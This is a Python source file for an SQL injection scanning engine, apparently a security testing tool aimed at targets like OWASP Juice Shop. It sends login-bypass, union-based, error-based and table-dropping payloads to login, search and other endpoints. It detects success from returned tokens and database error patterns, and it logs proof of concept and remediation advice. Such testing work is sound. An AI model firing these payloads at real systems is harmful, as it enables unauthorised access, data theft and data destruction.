"""
SQL Injection Testing Engine
Tests web applications for SQL injection vulnerabilities including
login bypass, search injection, error-based, and union-based attacks.
"""

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

import requests
import re
import json
import logging
from typing import List, Dict
from urllib.parse import urlparse, urljoin, urlencode, parse_qs, urlunparse


class SQLInjectionEngine:
    def __init__(self, target_url: str, logger: logging.Logger = None):
        self.target_url = target_url.rstrip('/')
        self.logger = logger or logging.getLogger(__name__)
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Valkyrie-Security-Scanner/1.0',
            'Content-Type': 'application/json',
        })
        self.vulnerabilities = []

        # SQL error patterns that indicate injection worked
        self.sql_error_patterns = [
            r'SQL syntax.*MySQL',
            r'Warning.*mysql_',
            r'MySqlException',
            r'valid MySQL result',
            r'check the manual that corresponds to your (MySQL|MariaDB)',
            r'MySqlClient\.',
            r'com\.mysql\.jdbc',
            r'Syntax error.*in query expression',
            r'Driver.*SQL[\-\_\ ]*Server',
            r'OLE DB.*SQL Server',
            r'(\bORA-\d{5})',
            r'Oracle error',
            r'Oracle.*Driver',
            r'Warning.*\boci_',
            r'Microsoft Access Driver',
            r'JET Database Engine',
            r'Access Database Engine',
            r'ODBC Microsoft Access',
            r'PostgreSQL.*ERROR',
            r'Warning.*\bpg_',
            r'valid PostgreSQL result',
            r'Npgsql\.',
            r'PG::SyntaxError',
            r'org\.postgresql\.util\.PSQLException',
            r'ERROR:\s+syntax error at or near',
            r'ERROR.*quoted string not properly terminated',
            r'SQLite/JQlite',
            r'SQLite\.Exception',
            r'(Microsoft|System)\.Data\.SQLite\.SQLiteException',
            r'Warning.*sqlite_',
            r'Warning.*SQLite3::',
            r'\[SQLITE_ERROR\]',
            r'SQLITE_CONSTRAINT',
            r'SQL error.*SQLITE',
            r'unrecognized token',
            r'SequelizeDatabaseError',
            r'SQLITE_ERROR',
        ]

    def run_all_tests(self, endpoints: List[str] = None) -> List[Dict]:
        """Run all SQL injection tests"""
        self.logger.info("=" * 80)
        self.logger.info("Starting SQL Injection Testing")
        self.logger.info("=" * 80)

        # 1. Test login endpoint for auth bypass
        self.test_login_injection()

        # 2. Test search endpoint for injection
        self.test_search_injection()

        # 3. Test user-provided endpoints for generic injection
        if endpoints:
            for endpoint in endpoints:
                self.test_generic_injection(endpoint)

        self.logger.info("=" * 80)
        self.logger.info(f"SQL Injection testing complete. Found {len(self.vulnerabilities)} vulnerabilities")
        self.logger.info("=" * 80)

        return self.vulnerabilities

    def test_login_injection(self) -> None:
        """Test login endpoint for SQL injection authentication bypass"""
        self.logger.info("\n[SQL INJECTION - LOGIN BYPASS] Testing login endpoint...")

        login_paths = [
            '/rest/user/login',
            '/api/auth/login',
            '/login',
            '/api/login',
        ]

        # Auth bypass payloads
        payloads = [
            {"email": "' OR 1=1--", "password": "x"},
            {"email": "admin'--", "password": "x"},
            {"email": "' OR '1'='1'--", "password": "x"},
            {"email": "admin@juice-sh.op'--", "password": "x"},
            {"email": "' OR 1=1#", "password": "x"},
            {"email": "') OR ('1'='1'--", "password": "x"},
            {"email": "' UNION SELECT * FROM Users--", "password": "x"},
        ]

        for path in login_paths:
            url = f"{self.target_url}{path}"

            # First check if endpoint exists
            try:
                check = self.session.post(url, json={"email": "test@test.com", "password": "test"}, timeout=10, verify=False)
                if check.status_code == 404:
                    self.logger.info(f"  Endpoint not found: {path}")
                    continue
                self.logger.info(f"  Found login endpoint: {path} (status: {check.status_code})")
            except requests.exceptions.ConnectionError:
                self.logger.info(f"  Cannot connect to: {path}")
                continue
            except Exception:
                continue

            # Test each payload
            for payload in payloads:
                try:
                    self.logger.info(f"  Testing payload: {payload['email']}")
                    response = self.session.post(url, json=payload, timeout=10, verify=False)

                    response_text = response.text
                    response_lower = response_text.lower()

                    # Check for successful auth bypass
                    if response.status_code == 200 and (
                        '"token"' in response_lower or
                        '"authentication"' in response_lower or
                        '"access_token"' in response_lower or
                        '"jwt"' in response_lower
                    ):
                        # Extract token for proof
                        try:
                            resp_json = response.json()
                            token_preview = str(resp_json)[:300]
                        except Exception:
                            token_preview = response_text[:300]

                        self.logger.warning(f"  CRITICAL: SQL Injection login bypass successful with: {payload['email']}")
                        self.add_vulnerability({
                            'endpoint': path,
                            'method': 'POST',
                            'vulnerability_type': 'sql_injection_auth_bypass',
                            'severity': 'critical',
                            'title': 'SQL Injection Authentication Bypass',
                            'description': (
                                f'The login endpoint at {path} is vulnerable to SQL injection, '
                                f'allowing an attacker to bypass authentication entirely. '
                                f'By injecting the payload "{payload["email"]}" into the email field, '
                                f'the application returns a valid authentication token, granting '
                                f'unauthorized access (typically as the first user in the database, often admin).'
                            ),
                            'proof_of_concept': (
                                f'POST {url}\n'
                                f'Content-Type: application/json\n\n'
                                f'{json.dumps(payload, indent=2)}\n\n'
                                f'Response ({response.status_code}):\n{token_preview}'
                            ),
                            'remediation': (
                                'Use parameterized queries (prepared statements) instead of string concatenation. '
                                'Never interpolate user input directly into SQL queries. '
                                'Use an ORM or query builder. '
                                'Implement input validation and sanitization as defense-in-depth.'
                            ),
                            'cvss_score': 9.8,
                        })
                        return  # Found critical vuln, no need to test more payloads on this endpoint

                    # Check for SQL errors (error-based injection)
                    if self._check_sql_errors(response_text):
                        self.logger.warning(f"  HIGH: SQL error detected with payload: {payload['email']}")
                        self.add_vulnerability({
                            'endpoint': path,
                            'method': 'POST',
                            'vulnerability_type': 'sql_injection_error_based',
                            'severity': 'high',
                            'title': 'SQL Injection (Error-Based) in Login',
                            'description': (
                                f'The login endpoint at {path} returns SQL error messages when injected '
                                f'with malicious input, confirming SQL injection vulnerability. '
                                f'An attacker can use error-based techniques to extract database information.'
                            ),
                            'proof_of_concept': (
                                f'POST {url}\n'
                                f'Content-Type: application/json\n\n'
                                f'{json.dumps(payload, indent=2)}\n\n'
                                f'Response ({response.status_code}):\n{response_text[:500]}'
                            ),
                            'remediation': (
                                'Use parameterized queries. Suppress detailed error messages in production. '
                                'Implement custom error pages that do not leak database information.'
                            ),
                            'cvss_score': 8.6,
                        })
                        return

                except requests.exceptions.Timeout:
                    self.logger.info(f"  Timeout testing payload on {path}")
                except Exception as e:
                    self.logger.debug(f"  Error testing login injection: {str(e)}")

        self.logger.info("  No SQL injection found in login endpoints")

    def test_search_injection(self) -> None:
        """Test search endpoints for SQL injection"""
        self.logger.info("\n[SQL INJECTION - SEARCH] Testing search endpoints...")

        search_paths = [
            '/rest/products/search?q=',
            '/api/search?q=',
            '/search?q=',
            '/api/products?search=',
        ]

        payloads = [
            "test'))--",
            "test' OR 1=1--",
            "test')) UNION SELECT 1--",
            "test')) UNION SELECT sql FROM sqlite_master--",
            "test%27))--",
            "1' OR '1'='1",
        ]

        for search_path in search_paths:
            # Split path and param
            if '?' in search_path:
                path_part, param_part = search_path.split('?', 1)
                param_name = param_part.rstrip('=')
            else:
                path_part = search_path
                param_name = 'q'

            # Check if endpoint exists with a normal query
            base_search_url = f"{self.target_url}{path_part}?{param_name}=test"
            try:
                check = self.session.get(base_search_url, timeout=10, verify=False)
                if check.status_code == 404:
                    self.logger.info(f"  Search endpoint not found: {path_part}")
                    continue
                self.logger.info(f"  Found search endpoint: {path_part} (status: {check.status_code})")
                normal_response_len = len(check.text)
            except requests.exceptions.ConnectionError:
                continue
            except Exception:
                continue

            for payload in payloads:
                try:
                    test_url = f"{self.target_url}{path_part}?{param_name}={payload}"
                    self.logger.info(f"  Testing: {param_name}={payload}")

                    response = self.session.get(test_url, timeout=10, verify=False)
                    response_text = response.text

                    # Check for SQL errors
                    if self._check_sql_errors(response_text):
                        self.logger.warning(f"  HIGH: SQL error in search with payload: {payload}")
                        self.add_vulnerability({
                            'endpoint': f"{path_part}?{param_name}=",
                            'method': 'GET',
                            'vulnerability_type': 'sql_injection_search',
                            'severity': 'high',
                            'title': 'SQL Injection in Search Endpoint',
                            'description': (
                                f'The search endpoint at {path_part} is vulnerable to SQL injection. '
                                f'SQL error messages are returned when injecting the payload "{payload}", '
                                f'confirming that user input is directly concatenated into SQL queries. '
                                f'An attacker can exploit this to extract sensitive data from the database.'
                            ),
                            'proof_of_concept': (
                                f'GET {test_url}\n\n'
                                f'Response ({response.status_code}):\n{response_text[:500]}'
                            ),
                            'remediation': (
                                'Use parameterized queries for search functionality. '
                                'Validate and sanitize search input. '
                                'Suppress SQL error messages in production responses.'
                            ),
                            'cvss_score': 7.5,
                        })
                        return

                    # Check for abnormal response (could indicate successful injection)
                    if response.status_code == 200:
                        try:
                            resp_json = response.json()
                            # If we got data back and it's different from normal
                            if isinstance(resp_json, dict) and 'data' in resp_json:
                                data = resp_json['data']
                                if isinstance(data, list) and len(data) > 0:
                                    # Check if response is significantly different from normal
                                    if abs(len(response_text) - normal_response_len) > 500:
                                        self.logger.warning(f"  MEDIUM: Anomalous search response with payload: {payload}")
                                        self.add_vulnerability({
                                            'endpoint': f"{path_part}?{param_name}=",
                                            'method': 'GET',
                                            'vulnerability_type': 'sql_injection_search',
                                            'severity': 'medium',
                                            'title': 'Potential SQL Injection in Search',
                                            'description': (
                                                f'The search endpoint at {path_part} returns anomalous results '
                                                f'when injected with SQL payload "{payload}". '
                                                f'The response size differs significantly from normal queries, '
                                                f'suggesting the SQL query structure was altered.'
                                            ),
                                            'proof_of_concept': (
                                                f'GET {test_url}\n\n'
                                                f'Normal response length: {normal_response_len}\n'
                                                f'Injected response length: {len(response_text)}\n\n'
                                                f'Response preview:\n{response_text[:300]}'
                                            ),
                                            'remediation': (
                                                'Use parameterized queries for search functionality. '
                                                'Validate search input against expected patterns.'
                                            ),
                                            'cvss_score': 6.5,
                                        })
                                        return
                        except (json.JSONDecodeError, ValueError):
                            pass

                    # Check for 500 errors (server errors from broken queries)
                    if response.status_code == 500:
                        self.logger.warning(f"  MEDIUM: Server error with SQL payload: {payload}")
                        self.add_vulnerability({
                            'endpoint': f"{path_part}?{param_name}=",
                            'method': 'GET',
                            'vulnerability_type': 'sql_injection_error_based',
                            'severity': 'medium',
                            'title': 'SQL Injection Causes Server Error in Search',
                            'description': (
                                f'The search endpoint at {path_part} returns a 500 Internal Server Error '
                                f'when injected with SQL payload "{payload}". This indicates the input '
                                f'is being processed by the SQL engine without proper sanitization.'
                            ),
                            'proof_of_concept': (
                                f'GET {test_url}\n\n'
                                f'Response: {response.status_code} Internal Server Error\n'
                                f'{response_text[:300]}'
                            ),
                            'remediation': (
                                'Use parameterized queries. Implement input validation. '
                                'Return generic error messages instead of stack traces.'
                            ),
                            'cvss_score': 6.5,
                        })
                        return

                except requests.exceptions.Timeout:
                    # Timeouts can indicate time-based blind injection
                    self.logger.info(f"  Timeout with payload (possible blind SQLi): {payload}")
                except Exception as e:
                    self.logger.debug(f"  Error testing search injection: {str(e)}")

        self.logger.info("  No SQL injection found in search endpoints")

    def test_generic_injection(self, endpoint: str) -> None:
        """Test a generic endpoint for SQL injection via query parameters"""
        self.logger.info(f"\n[SQL INJECTION - GENERIC] Testing endpoint: {endpoint}")

        # Skip login and search endpoints (already tested specifically)
        if any(skip in endpoint.lower() for skip in ['login', 'search']):
            self.logger.info(f"  Skipping {endpoint} (tested by specific module)")
            return

        url = f"{self.target_url}{endpoint}" if not endpoint.startswith('http') else endpoint

        payloads = [
            "'",
            "' OR '1'='1",
            "1 OR 1=1",
            "' UNION SELECT NULL--",
            "1; DROP TABLE test--",
            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        ]

        # Test GET with query parameter injection
        for payload in payloads:
            try:
                # If endpoint already has parameters, inject into them
                if '?' in url:
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    for param_name in params:
                        injected_params = params.copy()
                        injected_params[param_name] = [payload]
                        query_string = urlencode(injected_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=query_string))

                        response = self.session.get(test_url, timeout=10, verify=False)

                        if self._check_sql_errors(response.text):
                            self.logger.warning(f"  HIGH: SQL error on {endpoint} param={param_name}")
                            self.add_vulnerability({
                                'endpoint': endpoint,
                                'method': 'GET',
                                'vulnerability_type': 'sql_injection_parameter',
                                'severity': 'high',
                                'title': f'SQL Injection in Parameter: {param_name}',
                                'description': (
                                    f'Parameter "{param_name}" at endpoint {endpoint} is vulnerable to SQL injection. '
                                    f'SQL error messages leak when injecting payload "{payload}".'
                                ),
                                'proof_of_concept': (
                                    f'GET {test_url}\n\n'
                                    f'Response ({response.status_code}):\n{response.text[:500]}'
                                ),
                                'remediation': 'Use parameterized queries for all database operations.',
                                'cvss_score': 7.5,
                            })
                            return
                else:
                    # Try appending common ID parameters
                    for param in ['id', 'user_id', 'product_id']:
                        test_url = f"{url}?{param}={payload}"
                        response = self.session.get(test_url, timeout=5, verify=False)

                        if self._check_sql_errors(response.text):
                            self.logger.warning(f"  HIGH: SQL error on {endpoint} with {param}")
                            self.add_vulnerability({
                                'endpoint': endpoint,
                                'method': 'GET',
                                'vulnerability_type': 'sql_injection_parameter',
                                'severity': 'high',
                                'title': f'SQL Injection via {param} Parameter',
                                'description': (
                                    f'Endpoint {endpoint} is vulnerable to SQL injection through the '
                                    f'"{param}" parameter.'
                                ),
                                'proof_of_concept': (
                                    f'GET {test_url}\n\n'
                                    f'Response ({response.status_code}):\n{response.text[:500]}'
                                ),
                                'remediation': 'Use parameterized queries for all database operations.',
                                'cvss_score': 7.5,
                            })
                            return

            except requests.exceptions.Timeout:
                self.logger.info(f"  Timeout on {endpoint} with payload (possible blind SQLi)")
            except Exception as e:
                self.logger.debug(f"  Error on generic injection test: {str(e)}")

    def _check_sql_errors(self, response_text: str) -> bool:
        """Check if response contains SQL error messages"""
        for pattern in self.sql_error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    def add_vulnerability(self, vuln: Dict) -> None:
        """Add a vulnerability to the list"""
        self.vulnerabilities.append(vuln)
        self.logger.warning(f"\n{'*' * 60}")
        self.logger.warning(f"VULNERABILITY: {vuln['title']}")
        self.logger.warning(f"Severity: {vuln['severity'].upper()}")
        self.logger.warning(f"CVSS: {vuln.get('cvss_score', 'N/A')}")
        self.logger.warning(f"{'*' * 60}\n")
